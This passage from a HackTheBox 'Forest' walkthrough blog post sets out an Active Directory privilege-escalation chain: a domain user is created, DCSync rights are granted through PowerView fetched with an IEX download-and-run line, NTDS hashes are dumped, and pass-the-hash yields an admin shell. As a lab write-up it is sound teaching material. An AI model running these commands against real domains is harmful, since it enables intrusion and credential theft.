+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Config</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">parsed</span><span class="w">                                                                                </span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Callback</span><span class="w"> </span><span class="n">added</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">UUID</span><span class="w"> </span><span class="mi">4</span><span class="n">B324FC8</span><span class="o">-</span><span class="mi">1670</span><span class="o">-</span><span class="mi">01</span><span class="n">D3</span><span class="o">-</span><span class="mi">1278</span><span class="o">-</span><span class="mi">5</span><span class="n">A47BF6EE188</span><span class="w"> </span><span class="nl">V</span><span class="p">:</span><span class="mf">3.0</span><span class="w">                                                                                                                                       </span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Callback</span><span class="w"> </span><span class="n">added</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">UUID</span><span class="w"> </span><span class="mi">6</span><span class="n">BFFD098</span><span class="o">-</span><span class="n">A112</span><span class="o">-</span><span class="mi">3610</span><span class="o">-</span><span class="mi">9833</span><span class="o">-</span><span class="mi">46</span><span class="n">C3F87E345A</span><span class="w"> </span><span class="nl">V</span><span class="p">:</span><span class="mf">1.0</span><span class="w">                          </span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Config</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">parsed</span><span class="w">                                                                                </span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Config</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">parsed</span><span class="w">                                                                                </span>
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">Config</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">parsed</span><span class="w"></span>
+</pre></div>
+
+
+<p>Then I connect to the share from the Windows target box and copy the zip file over:</p>
+<div class="highlight"><pre><span></span><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="err">\</span><span class="n">desktop</span><span class="o">&gt;</span> <span class="n">net</span> <span class="n">use</span> <span class="err">\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">4</span><span class="err">\</span><span class="n">myshare</span> <span class="o">/</span><span class="n">u</span><span class="p">:</span><span class="n">m4rc0ff</span> <span class="n">test123</span>
+<span class="n">The</span> <span class="n">command</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+
+<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="err">\</span><span class="n">desktop</span><span class="o">&gt;</span> <span class="k">copy</span> <span class="mi">20200926081701</span><span class="n">_BloodHound</span><span class="p">.</span><span class="n">zip</span> <span class="err">\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">4</span><span class="err">\</span><span class="n">myshare</span>
+</pre></div>
+
+
+<p>Once this is done, I open BloodHound interface on my Kali box and I upload the zip file. From the <strong>Queries</strong> menu on the top left I select <strong>Find Shortest Paths to Domain Admins</strong> option. After some clean up I have this nice graph showing the privilege relationships:</p>
+<p><img alt="" src="../images/forest-bloodhound.png"></p>
+<p>As shown in the graph above, generated with Bloodhound, the user <strong>svc-alfresco</strong> is member of the <strong>Service Accounts</strong> group which in turn is member of the <strong>Privileged IT Accounts</strong> group which in turn is member of the <strong>Account Operators</strong> group.</p>
+<p>This can also be confirmed with the following command:</p>
+<div class="highlight"><pre><span></span><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">svc</span><span class="o">-</span><span class="n">alfresco</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="o">/</span><span class="n">groups</span>
+
+<span class="k">GROUP</span> <span class="n">INFORMATION</span>
+<span class="c1">-----------------</span>
+
+<span class="k">Group</span> <span class="n">Name</span>                                 <span class="k">Type</span>             <span class="n">SID</span>                                           <span class="n">Attributes</span>
+<span class="o">==========================================</span> <span class="o">================</span> <span class="o">=============================================</span> <span class="o">==================================================</span>
+<span class="n">Everyone</span>                                   <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="k">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">0</span>                                       <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">BUILTIN</span><span class="err">\</span><span class="n">Users</span>                              <span class="k">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">545</span>                                  <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">BUILTIN</span><span class="err">\</span><span class="n">Pre</span><span class="o">-</span><span class="n">Windows</span> <span class="mi">2000</span> <span class="n">Compatible</span> <span class="k">Access</span> <span class="k">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">554</span>                                  <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">BUILTIN</span><span class="err">\</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span>            <span class="k">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">580</span>                                  <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">BUILTIN</span><span class="err">\</span><span class="n">Account</span> <span class="n">Operators</span>                  <span class="k">Alias</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">32</span><span class="o">-</span><span class="mi">548</span>                                  <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">NETWORK</span>                       <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="k">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">2</span>                                       <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">Authenticated</span> <span class="n">Users</span>           <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="k">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">11</span>                                      <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">This</span> <span class="n">Organization</span>             <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="k">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">15</span>                                      <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">HTB</span><span class="err">\</span><span class="n">Privileged</span> <span class="n">IT</span> <span class="n">Accounts</span>                 <span class="k">Group</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3072663084</span><span class="o">-</span><span class="mi">364016917</span><span class="o">-</span><span class="mi">1341370565</span><span class="o">-</span><span class="mi">1149</span> <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">HTB</span><span class="err">\</span><span class="n">Service</span> <span class="n">Accounts</span>                       <span class="k">Group</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3072663084</span><span class="o">-</span><span class="mi">364016917</span><span class="o">-</span><span class="mi">1341370565</span><span class="o">-</span><span class="mi">1148</span> <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">NT</span> <span class="n">AUTHORITY</span><span class="err">\</span><span class="n">NTLM</span> <span class="n">Authentication</span>           <span class="n">Well</span><span class="o">-</span><span class="n">known</span> <span class="k">group</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="mi">10</span>                                   <span class="n">Mandatory</span> <span class="k">group</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">Enabled</span> <span class="k">group</span>
+<span class="n">Mandatory</span> <span class="n">Label</span><span class="err">\</span><span class="n">Medium</span> <span class="n">Mandatory</span> <span class="k">Level</span>     <span class="n">Label</span>            <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="mi">8192</span>
+</pre></div>
+
+
+<p>The <strong>Account Operators</strong> group presents <strong>GenericAll</strong> privileges over the <strong>Exchange Windows Permissions</strong> group. By clicking on the edge between the two groups we can see these details:</p>
+<p><img alt="" src="../images/forest-genericAll.png"></p>
+<p><img alt="" src="../images/forest-abuse-info.png"></p>
+<p><img alt="" src="../images/forest-abuse-info2.png"></p>
+<p>The above screenshots provide a detailed description as well as specific instructions of how to execute the attack.</p>
+<p>Continuing with this pace we see that the group  <strong>Exchange Windows Permissions</strong> has <strong>WriteDacl</strong> rights over the <strong>HTB.LOCAL</strong> domain. Here the details:</p>
+<p><img alt="" src="../images/forest-writeDacl.png"></p>
+<p><img alt="" src="../images/forest-writeDacl2.png"></p>
+<p><img alt="" src="../images/forest-writeDacl3.png"></p>
+<p>What does this all mean for us? Let's put things in practice:</p>
+<ul>
+<li>We can create a user on the domain because <strong>svc-alfresco</strong> is a member of the group <strong>Account Operators</strong>:</li>
+</ul>
+<p><code>*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net user marco password /add /domain
+  The command completed successfully.</code></p>
+<ul>
+<li>We can add that user to the <strong>Exchange Windows Permission</strong> group since <strong>svc-alfresco</strong> has <strong>GenericAll</strong> privileges on it. </li>
+</ul>
+<p><code>*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group "Exchange Windows Permissions" /add marco
+  The command completed successfully.</code></p>
+<ul>
+<li>Since the <strong>Exchange Windows Permission</strong> group has WriteDacl rights over the domain, we can give that user <strong>DCSync</strong> rights so that he would be able to perform domain replication and therefore dump all the password hashes from the domain. To do that we need to first import <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>.</li>
+</ul>
+<p><code>*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; IEX (new-object net.webclient).downloadstring('http:/*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; IEX (new-object net.webclient).downloadstring('http://10.10.14.5/PowerView.ps1')</code></p>
+<p><code>kali@kali:~/Tools/PowerSploit/Recon$ sudo python -m http.server 80
+  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+  10.10.10.161 - - [28/Sep/2020 10:36:18] "GET /PowerView.ps1 HTTP/1.1" 200 -</code></p>
+<p><code>*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
+  *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; $Cred = New-Object System.Management.Automation.PSCredential('htb\marco', $SecPassword)
+  *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity marco -Rights DCSync</code></p>
+<p>Now that the user has been added to the <strong>Exchange Windows Permission</strong> group and has been given <strong>DCSync</strong> rights we can dump the hashes using <code>secretdump.py</code> from Kali:</p>
+<div class="highlight"><pre><span></span><span class="n">kali</span><span class="p">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">results</span><span class="o">/</span><span class="mf">10.10.10.161</span><span class="err">$</span> <span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">just</span><span class="o">-</span><span class="n">dc</span> <span class="n">htb</span><span class="o">/</span><span class="nl">marco</span><span class="p">:</span><span class="n">password</span><span class="mf">@10.10.10.161</span>                                                                                               
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.9.21</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2020</span> <span class="n">SecureAuth</span> <span class="n">Corporation</span>   
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span><span class="err">\</span><span class="nl">uid</span><span class="p">:</span><span class="nl">rid</span><span class="p">:</span><span class="nl">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>                          
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">the</span> <span class="n">DRSUAPI</span> <span class="n">method</span> <span class="n">to</span> <span class="n">get</span> <span class="n">NTDS</span><span class="p">.</span><span class="n">DIT</span> <span class="n">secrets</span>       
+<span class="n">htb</span><span class="p">.</span><span class="n">local</span><span class="err">\</span><span class="nl">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="o">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">32693</span><span class="n">b11e6aa90eb43d32c72a07ceea6</span><span class="o">:::</span>                                                                                                             
+<span class="nl">Guest</span><span class="p">:</span><span class="mi">501</span><span class="o">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="o">:::</span>         
+<span class="nl">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="o">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">819</span><span class="n">af826bb148e603acb0f33d17632f8</span><span class="o">:::</span>
+<span class="nl">DefaultAccount</span><span class="p">:</span><span class="mi">503</span><span class="o">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="o">:::</span>                                                                                                                      
+<span class="n">htb</span><span class="p">.</span><span class="n">local</span><span class="err">\$</span><span class="mi">331000</span><span class="o">-</span><span class="nl">VK4ADACQNUCA</span><span class="p">:</span><span class="mi">1123</span><span class="o">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="o">:::</span>
+<span class="n">htb</span><span class="p">.</span><span class="n">local</span><span class="err">\</span><span class="nl">SM_2c8eef0a09b545acb</span><span class="p">:</span><span class="mi">1124</span><span class="o">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="o">:::</span>
+<span class="n">htb</span><span class="p">.</span><span class="n">local</span><span class="err">\</span><span class="nl">SM_ca8c2ed5bdab4dc9b</span><span class="p">:</span><span class="mi">1125</span><span class="o">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="o">:::</span>               
+<span class="n">htb</span><span class="p">.</span><span class="n">local</span><span class="err">\</span><span class="nl">SM_75a538d3025e4db9a</span><span class="p">:</span><span class="mi">1126</span><span class="o">:</span><span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="o">:::</span>
+
+<span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span>
+</pre></div>
+
+
+<p>With the Administrator user hash at our disposal we can pwerform a pass-the-hash attack using <code>psexec.py</code> and get a shell:</p>
+<div class="highlight"><pre><span></span><span class="n">kali</span><span class="p">@</span><span class="nl">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">results</span><span class="o">/</span><span class="mf">10.10.10.161</span><span class="err">$</span> <span class="n">psexec</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="nl">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">32693</span><span class="n">b11e6aa90eb43d32c72a07ceea6</span> <span class="n">administrator</span><span class="mf">@10.10.10.161</span>
+<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.9.21</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2020</span> <span class="n">SecureAuth</span> <span class="n">Corporation</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="mf">10.10.10.161</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="err">$</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">EqFArccL</span><span class="p">.</span><span class="n">exe</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="mf">10.10.10.161</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">WVXx</span> <span class="n">on</span> <span class="mf">10.10.10.161</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">WVXx</span><span class="p">.....</span>
+<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.14393</span><span class="p">]</span>
+<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2016</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+
+<span class="nl">C</span><span class="p">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span><span class="n">type</span> <span class="nl">c</span><span class="p">:</span><span class="err">\</span><span class="n">users</span><span class="err">\</span><span class="n">administrator</span><span class="err">\</span><span class="n">desktop</span><span class="err">\</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="n">f0</span><span class="o">****************************</span><span class="n">cc</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Forest.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Forest"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
